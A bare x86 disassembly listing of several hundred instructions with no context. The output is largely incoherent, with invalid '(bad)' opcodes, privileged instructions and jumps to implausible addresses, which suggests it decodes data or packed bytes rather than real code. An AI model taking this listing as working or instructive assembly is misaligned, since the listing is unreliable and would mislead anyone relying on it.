  41a7da:	jne    0x41a769
  41a7dc:	mov    edx,eax
  41a7de:	clc    
  41a7df:	dec    ebp
  41a7e0:	out    dx,eax
  41a7e1:	(bad)  
  41a7e2:	dec    esp
  41a7e4:	mov    DWORD PTR [ebp-0x10],ecx
  41a7e7:	lea    eax,[ebp-0x38]
  41a7ea:	cmp    DWORD PTR [ebp-0x64],ecx
  41a7ed:	lea    ecx,[ebx-0x38b2273c]
  41a7f3:	mov    eax,ebx
  41a7f5:	cld    
  41a7f6:	(bad)  
  41a7f7:	iret   
  41a7f8:	mov    esp,0xf74de8cb
  41a7fd:	jmp    0x86aa01
  41a802:	test   DWORD PTR [ebx],esi
  41a804:	je     0x41a7a2
  41a806:	mov    ecx,DWORD PTR [edi]
  41a808:	fdivr  st,st(6)
  41a80a:	mov    DWORD PTR [eax],0xe8ff8bc3
  41a810:	lock iret 
  41a812:	inc    ebp
  41a813:	lock push eax
  41a815:	retf   
  41a816:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  41a81d:	test   DWORD PTR [ebp-0x7c],0x32d89c8b
  41a824:	dec    ebp
  41a825:	mov    DWORD PTR [ebx],ebp
  41a827:	fmul   DWORD PTR [ecx+0x458bd845]
  41a82d:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  41a833:	enter  0x1303,0xc
  41a837:	inc    ebp
  41a838:	dec    ebp
  41a839:	xor    edi,DWORD PTR [ebx]
  41a83b:	add    esi,DWORD PTR [edx+0x50]
  41a83e:	mov    ecx,DWORD PTR [eax+esi*8]
  41a841:	inc    ebp
  41a842:	inc    eax
  41a843:	push   eax
  41a844:	mov    ebp,esp
  41a846:	lock inc DWORD PTR [ecx-0x75]
  41a84a:	mov    esp,esp
  41a84c:	fadd   DWORD PTR [eax]
  41a84e:	rol    edi,0xee
  41a851:	test   BYTE PTR [eax],al
  41a853:	dec    esp
  41a854:	push   0x32
  41a856:	dec    DWORD PTR [ebx-0x30ba0314]
  41a85c:	push   eax
  41a85d:	mov    dh,0x21
  41a85f:	add    edi,edi
  41a861:	cmp    edi,DWORD PTR [eax-0x7877af1]
  41a867:	add    BYTE PTR [ebp-0x75],al
  41a86a:	(bad)  
  41a86b:	loopne 0x41a839
  41a86d:	add    BYTE PTR [ebp+0x4584f8c7],al
  41a873:	dec    esp
  41a874:	xor    esi,DWORD PTR [edx]
  41a876:	pushf  
  41a877:	mov    eax,edi
  41a879:	cld    
  41a87a:	(bad)  
  41a87b:	iret   
  41a87c:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41a882:	mov    DWORD PTR [edi],ecx
  41a884:	in     al,0x58
  41a886:	dec    ebp
  41a887:	add    BYTE PTR [ecx+0x4df0e08b],cl
  41a88d:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41a893:	dec    esp
  41a894:	mov    DWORD PTR [edx],esi
  41a896:	fmul   QWORD PTR [ebx-0x30cc03b3]
  41a89c:	add    esi,DWORD PTR [esi+0x3bd80389]
  41a8a2:	test   DWORD PTR [edi],0x3d3800
  41a8a8:	test   DWORD PTR [ebx+0x84dcf8],ecx
  41a8ae:	add    edi,eax
  41a8b0:	add    BYTE PTR [ebp+ecx*2-0x74cdccb4],al
  41a8b7:	mov    eax,DWORD PTR [ebx]
  41a8b9:	cld    
  41a8ba:	mov    edi,ecx
  41a8bc:	hlt    
  41a8bd:	mov    dh,0x45
  41a8bf:	add    esi,DWORD PTR [ebx]
  41a8c1:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  41a8c7:	add    BYTE PTR [eax],al
  41a8c9:	mov    eax,DWORD PTR [ebp-0x20]
  41a8cc:	mov    eax,DWORD PTR [eax]
  41a8ce:	call   0x33c5f69a
  41a8d3:	dec    esp
  41a8d4:	add    esi,DWORD PTR [edx]
  41a8d6:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  41a8dc:	cld    
  41a8dd:	iret   
  41a8de:	(bad)  
  41a8df:	mov    ebx,es
  41a8e1:	dec    esp
  41a8e2:	push   0x32
  41a8e4:	lea    esi,[edx]
  41a8e6:	mov    al,0x8b
  41a8e8:	call   0xff4ba3dd
  41a8ed:	iret   
  41a8ee:	inc    ebp
  41a8ef:	mov    WORD PTR [ebx-0x75cdccb4],cs
  41a8f5:	or     al,BYTE PTR ds:0xe4728b
  41a8fb:	or     DWORD PTR [ebp-0x31],ecx
  41a8fe:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb0]
  41a905:	cmp    al,cl
  41a907:	je     0x41aae1
  41a90d:	mov    eax,DWORD PTR [ebp-0x10]
  41a910:	mov    eax,DWORD PTR [eax]
  41a912:	xor    eax,edi
  41a914:	mov    al,BYTE PTR [ebp+eax*1+0x32724c]
  41a91b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a91e:	xor    ecx,DWORD PTR [ecx]
  41a920:	bswap  edi
  41a922:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb4],0x32
  41a92a:	add    DWORD PTR [ebx+0x945dc00],ecx
  41a930:	mov    ecx,edi
  41a932:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a939:	or     al,BYTE PTR [eax]
  41a93b:	mov    ecx,DWORD PTR [ebp-0x20]
  41a93e:	xor    ecx,DWORD PTR [ecx]
  41a940:	bswap  edi
  41a942:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb0],0x3a
  41a94a:	add    DWORD PTR [edi],ecx
  41a94c:	add    BYTE PTR [eax-0x7474ffbb],dl
  41a952:	xor    ebx,esp
  41a954:	mov    al,BYTE PTR [eax]
  41a956:	add    eax,0x8472c7
  41a95b:	dec    esp
  41a95c:	dec    ebp
  41a95d:	xor    dh,BYTE PTR [ebx]
  41a95f:	mov    ecx,DWORD PTR [edi]
  41a961:	lock ror BYTE PTR [ecx],0xcb
  41a965:	iret   
  41a966:	ror    DWORD PTR [esp+eax*4+0x32014c],0x32
  41a96e:	inc    ebp
  41a96f:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41a975:	iret   
  41a976:	add    eax,0x4c728c
  41a97b:	xor    cl,BYTE PTR [ebp+0xa]
  41a97e:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41a984:	or     eax,0x8c72cf
  41a989:	push   eax
  41a98a:	shl    DWORD PTR [edx],0x4d
  41a98d:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41a993:	fmul   QWORD PTR ds:0xc77200
  41a999:	test   cl,al
  41a99b:	dec    esp
  41a99c:	dec    ebp
  41a99d:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41a9a3:	or     DWORD PTR ds:0x8c72cf,ecx
  41a9a9:	dec    esp
  41a9aa:	enter  0x8532,0x32
  41a9ae:	add    BYTE PTR [ebx+0x945e000],cl
  41a9b4:	mov    ecx,edi
  41a9b6:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054c]
  41a9bd:	or     al,BYTE PTR [eax]
  41a9bf:	mov    ecx,DWORD PTR [ebp-0x24]
  41a9c2:	mov    ecx,DWORD PTR [ecx]
  41a9c4:	xor    ecx,edi
  41a9c6:	mov    cl,BYTE PTR [ebp+ecx*1+0x327250]
  41a9cd:	cmp    al,cl
  41a9cf:	jne    0x41aa1e
  41a9d1:	lea    ecx,[ebx-0x7517cc50]
  41a9d7:	sti    
  41a9d8:	or     eax,0x4d72ff
  41a9dd:	cmp    eax,ecx
  41a9df:	je     0x41aa2e
  41a9e1:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  41a9e7:	ret    
  41a9e8:	or     eax,0x8b7245
  41a9ed:	call   0x84c771ba
  41a9f2:	add    BYTE PTR [eax+eax*1-0x74ccbace],bl
  41a9f9:	mov    esi,DWORD PTR [ebx]
  41a9fb:	cld    
  41a9fc:	mov    dl,BYTE PTR [ebp+0x5]
  41a9ff:	xor    esi,DWORD PTR [edx+0x3]
  41aa02:	add    BYTE PTR [ebx],bh
  41aa04:	dec    ebp
  41aa05:	jnp    0x8b40de02
  41aa0b:	mov    ecx,DWORD PTR ds:0x4d72fc
  41aa11:	xor    eax,ecx
  41aa13:	add    ecx,DWORD PTR [ebp+0x3b]
  41aa16:	mov    esi,DWORD PTR [ebp+0x33]
  41aa19:	mov    ecx,DWORD PTR [edx+0x724d0de8]
  41aa1f:	xor    eax,DWORD PTR [eax]
  41aa21:	(bad)  
  41aa22:	ror    DWORD PTR [eax],0x4d
  41aa25:	jb     0x41a9b2
  41aa27:	add    BYTE PTR [ebx],dh
  41aa29:	ja     0x41a9b5
  41aa2b:	sbb    BYTE PTR ds:0x8d7275,cl
  41aa31:	cwde   
  41aa32:	enter  0x50e8,0xf3
  41aa36:	inc    ebp
  41aa37:	dec    DWORD PTR [ebx-0x7574ccbb]
  41aa3d:	fadd   DWORD PTR ds:0xc372c7
  41aa43:	ror    DWORD PTR [ebp+0x13],0x8b
  41aa47:	inc    ebp
  41aa48:	xor    esi,DWORD PTR [ebx]
  41aa4a:	mov    al,BYTE PTR [ebx]
  41aa4c:	or     eax,0x187250
  41aa51:	inc    ebp
  41aa52:	rcl    DWORD PTR [eax+0x4d],0xdc
  41aa56:	mov    edi,edi
  41aa58:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  41aa5e:	jb     0x41a9e9
  41aa60:	add    ah,bl
  41aa62:	shl    DWORD PTR [ebp+0x4d],0xff
  41aa66:	mov    ebx,esp
  41aa68:	xor    eax,DWORD PTR [ebp-0x76]
  41aa6b:	add    ecx,DWORD PTR ds:0xe87208
  41aa71:	repz enter 0x10ff,0x45
  41aa76:	inc    ebp
  41aa77:	mov    edx,DWORD PTR [eax-0x28]
  41aa7a:	xor    bh,al
  41aa7c:	inc    ebx
  41aa7e:	mov    eax,ecx
  41aa80:	mov    eax,0xa00c111
  41aa85:	jne    0x41aacc
  41aa87:	mov    esi,DWORD PTR [ebx]
  41aa89:	test   al,0x3
  41aa8b:	inc    ebp
  41aa8c:	mov    DWORD PTR [eax-0xc],edx
  41aa8f:	mov    ds:0x8b33ff45,al
  41aa94:	lea    edx,[eax]
  41aa96:	xor    BYTE PTR [ebp+0x72],cl
  41aa99:	add    DWORD PTR [eax],eax
  41aa9b:	mov    eax,edi
  41aa9d:	lods   al,BYTE PTR ds:[esi]
  41aa9e:	dec    ebp
  41aa9f:	inc    ebp
  41aaa0:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  41aaa6:	retf   
  41aaa7:	mov    edx,ecx
  41aaa9:	adc    al,0x84
  41aaab:	(bad)  
  41aaac:	std    
  41aaad:	ret    
  41aaae:	jmp    FWORD PTR [edi-0x37474bb]
  41aab4:	hlt    
  41aab5:	push   ebp
  41aab6:	(bad)  
  41aab7:	xor    eax,ebx
  41aab9:	(bad)  
  41aaba:	enter  0x1111,0x72
  41aabe:	inc    ebp
  41aabf:	add    BYTE PTR [ebx-0x387deb3f],cl
  41aac5:	cld    
  41aac6:	test   bh,bh
  41aac8:	pushf  
  41aac9:	inc    ebp
  41aaca:	xor    bl,BYTE PTR [edi-0x15]
  41aacd:	pop    ebx
  41aace:	push   0xffffffc2
  41aad0:	inc    DWORD PTR [eax]
  41aad2:	in     al,dx
  41aad3:	mov    eax,DWORD PTR [ebp+0x51]
  41aad6:	push   eax
  41aad7:	inc    ebp
  41aad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aad9:	mov    edi,edi
  41aadb:	or     BYTE PTR [ebx+0x4d80fc16],cl
  41aae1:	add    DWORD PTR [ebx],esi
  41aae3:	add    BYTE PTR [ebx],al
  41aae5:	add    BYTE PTR [ebx],bh
  41aae7:	icebp  
  41aae8:	je     0x41aaf2
  41aaea:	mov    eax,DWORD PTR [edi]
  41aaec:	cld    
  41aaed:	rol    edi,0x72
  41aaf0:	ret    
  41aaf1:	add    BYTE PTR [edx-0x2f],ch
  41aaf4:	lea    edx,[eax]
  41aaf6:	cwde   
  41aaf7:	jne    0x41aae1
  41aaf9:	(bad)  
  41aafa:	clc    
  41aafb:	or     al,0xff
  41aafd:	inc    DWORD PTR [ebp-0x18]
  41ab00:	cmp    ebx,0x18
  41ab03:	inc    DWORD PTR [ebp+0x6]
  41ab06:	call   FWORD PTR [ebp-0x54]
  41ab09:	or     al,0x75
  41ab0b:	push   ebp
  41ab0c:	mov    ebp,esp
  41ab0e:	test   al,0x53
  41ab10:	inc    ebp
  41ab11:	mov    edx,DWORD PTR [eax-0x75]
  41ab14:	imul   ecx,DWORD PTR [eax],0xffffffff
  41ab17:	dec    ebp
  41ab18:	mov    edx,DWORD PTR [edi-0x4]
  41ab1b:	push   ebp
  41ab1c:	dec    ebp
  41ab1d:	push   ecx
  41ab1e:	xor    esi,DWORD PTR [ebx]
  41ab20:	add    edi,DWORD PTR [edi+0x74723b]
  41ab26:	push   0xffffffc7
  41ab28:	inc    DWORD PTR [ecx]
  41ab2a:	lods   al,BYTE PTR ds:[esi]
  41ab2b:	inc    ebp
  41ab2c:	inc    ebp
  41ab2d:	mov    eax,DWORD PTR [ebx]
  41ab2f:	xchg   esp,eax
  41ab30:	or     BYTE PTR [eax],al
  41ab32:	call   0xffcda3c2
  41ab37:	adc    al,0x45
  41ab39:	or     BYTE PTR [ebx+0x800ac01],0x0
  41ab40:	inc    ebp
  41ab41:	inc    ecx
  41ab42:	add    ecx,DWORD PTR [ebx-0x76baebec]
  41ab48:	mov    eax,DWORD PTR [ecx]
  41ab4a:	call   0x338af84f
  41ab4f:	push   0x3
  41ab51:	push   0xc1300f
  41ab56:	dec    ebp
  41ab57:	jo     0x41aae4
  41ab59:	push   0xffffffd4
  41ab5b:	dec    edi
  41ab5d:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf764],ecx
  41ab64:	cmp    eax,edi
  41ab66:	cmovne edx,DWORD PTR [edi-0x75]
  41ab6a:	call   DWORD PTR [eax]
  41ab6c:	mov    eax,DWORD PTR [ebp+0x8]
  41ab6f:	call   FWORD PTR [esi+0x14]
  41ab72:	leave  
  41ab73:	inc    ebp
  41ab74:	adc    BYTE PTR [eax+0x55],dl
  41ab77:	jne    0x41ab65
  41ab79:	call   0xff52ab09
  41ab7e:	dec    ebp
  41ab7f:	inc    ebp
  41ab80:	mov    ecx,DWORD PTR [ebx+0x390338b]
  41ab86:	add    BYTE PTR [ebx],bh
  41ab88:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  41ab8c:	push   ebp
  41ab8d:	or     al,0x51
  41ab8f:	dec    ebp
  41ab90:	xor    DWORD PTR [ebx],0xf32039c
  41ab96:	cmp    eax,DWORD PTR [ebp+0x74]
  41ab99:	mov    edi,edi
  41ab9b:	pop    edi
  41ab9c:	adc    BYTE PTR [ebx+0x75],bl
  41ab9f:	ret    0x50
  41aba2:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  41aba6:	(bad)  
  41aba7:	clc    
  41aba8:	mov    esp,ebp
  41abaa:	pop    ecx
  41abab:	mov    ecx,0xf80085c2
  41abb0:	mov    ecx,DWORD PTR [ecx+edx*2]
  41abb3:	push   esi
  41abb4:	push   esi
  41abb5:	(bad)  
  41abb6:	lock inc DWORD PTR [ebp+0x44]
  41abba:	mov    edx,DWORD PTR [eax]
  41abbc:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41abc0:	or     BYTE PTR [ebp+0x7],dl
  41abc3:	push   ecx
  41abc4:	ret    
  41abc5:	xor    ebx,DWORD PTR [esi+edi*4+0x37232]
  41abcc:	mov    esi,edi
  41abce:	mov    edi,DWORD PTR [esp+edx*1+0xc]
  41abd2:	cmp    BYTE PTR [ebp+0x1],0x89
  41abd6:	add    BYTE PTR [eax+ecx*1],ah
  41abd9:	cmp    DWORD PTR [ebp+0x10],eax
  41abdc:	mov    edx,DWORD PTR [esi]
  41abde:	xchg   esp,eax
  41abdf:	dec    esp
  41abe0:	add    BYTE PTR [eax],dl
  41abe2:	mov    ecx,edx
  41abe4:	add    edx,DWORD PTR [esp+edi*1+0x8]
  41abe8:	dec    ebp
  41abe9:	into   
  41abea:	mov    ebp,DWORD PTR [edi+0x240089d8]
  41abf0:	mov    edx,DWORD PTR [eax+0x14]
  41abf3:	das    
  41abf4:	add    al,0x45
  41abf6:	add    BYTE PTR [ebp+0x0],dh
  41abf9:	mov    edi,edi
  41abfb:	and    al,0x50
  41abfd:	mov    eax,DWORD PTR [eax]
  41abff:	and    al,0xd1
  41ac01:	xor    eax,DWORD PTR [esi]
  41ac03:	lea    eax,[ebp+0x8]
  41ac06:	xor    esi,DWORD PTR [edx+0x3]
  41ac09:	add    BYTE PTR [ecx+0x4510fc44],cl
  41ac0f:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  41ac15:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  41ac1f:	xor    bh,bh
  41ac21:	pushf  
  41ac22:	mov    edi,edi
  41ac24:	or     BYTE PTR [esi+ecx*1],cl
  41ac27:	jne    0x41abec
  41ac29:	call   0xaabf5
  41ac2e:	adc    BYTE PTR [ebp+eax*2+0xc],al
  41ac32:	mov    ebx,DWORD PTR [eax]
  41ac34:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  41ac38:	mov    DWORD PTR [edi+ebp*4-0x73],0x750110fc
  41ac40:	pop    esi
  41ac41:	dec    ecx
  41ac43:	and    al,0x10
  41ac45:	call   DWORD PTR [ebp+0x24]
  41ac48:	in     al,dx
  41ac49:	call   0xffc5ab32
  41ac4e:	adc    BYTE PTR [ecx+esi*1+0xc],al
  41ac52:	pushf  
  41ac53:	pop    esi
  41ac54:	mov    ebp,esp
  41ac56:	and    al,0xc2
  41ac58:	push   edi
  41ac59:	add    BYTE PTR [ecx+0x33],al
  41ac5c:	mov    DWORD PTR [ebp+0x24],esi
  41ac5f:	test   DWORD PTR [ebx-0x45f7db8b],ecx
  41ac65:	dec    DWORD PTR [eax]
  41ac67:	and    al,0x7
  41ac69:	(bad)  
  41ac6a:	cli    
  41ac6b:	and    al,0x9c
  41ac6d:	or     BYTE PTR [edx],dh
  41ac6f:	sbb    BYTE PTR [ebx],al
  41ac71:	adc    al,0x89
  41ac73:	jmp    DWORD PTR [esp]
  41ac76:	mov    ecx,DWORD PTR [ebx+0x1c7c0c0c]
  41ac7c:	adc    al,0x8
  41ac7e:	dec    ebp
  41ac7f:	adc    BYTE PTR [ebp-0x7c],dh
  41ac82:	mov    esi,DWORD PTR [edx]
  41ac84:	and    al,0x24
  41ac86:	xor    eax,DWORD PTR [ebp-0x63dbf175]
  41ac8c:	add    edi,eax
  41ac8e:	pcmpeqb mm1,mm2
  41ac91:	jmp    0x41acdf
  41ac93:	dec    DWORD PTR [eax]
  41ac95:	je     0x41ac82
  41ac97:	mov    edi,DWORD PTR [ecx]
  41ac99:	pop    ebp
  41ac9a:	adc    BYTE PTR [esp+ecx*2-0x3e],al
  41ac9e:	pushf  
  41ac9f:	mov    DWORD PTR [eax-0x8],ebp
  41aca2:	jge    0x41ad0c
  41aca4:	dec    DWORD PTR [ecx+0x5fbf7424]
